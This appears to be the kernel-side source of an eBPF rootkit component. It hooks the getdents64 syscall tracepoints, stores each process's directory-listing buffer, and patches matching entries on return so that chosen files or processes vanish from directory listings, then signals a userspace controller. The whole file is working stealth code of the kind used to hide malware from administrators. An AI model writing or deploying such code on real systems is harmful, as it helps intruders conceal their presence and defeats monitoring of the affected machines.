#include "main.h"

char LICENSE[] SEC("license") = "GPL";

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
   u32 pid = bpf_get_current_pid_tgid() >> 32;

   u64 dirents_buf = ctx->args[1];

   bpf_map_update_elem(&map_dirent, &pid, &dirents_buf, BPF_ANY);
   return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
   u64 pid = bpf_get_current_pid_tgid() >> 32;

   u64 * dirents_buf = get_dirent_buf(&pid);
   struct userspace_data * userspace_data = get_userspace_data();

   if (dirents_buf == NULL || userspace_data == NULL) return 0;

   struct dirents_data_t dirents_data = {
      .bpos = 0,
      .userspace_data = userspace_data,
      .dirents_buf = dirents_buf,
      .buff_size = ctx->ret,
      .d_reclen = 0,
      .d_reclen_prev = 0,
      .d_reclen_new = 0,
      .patch_succeded = false,
   };

   bpf_loop(MAX_DIRENTS, patch_dirent_if_found, &dirents_data, 0);

   if (dirents_data.patch_succeded) {
      notify_userspace(ctx, pid);
   }

   bpf_map_delete_elem(&map_dirent, &pid);

   return 0;
}
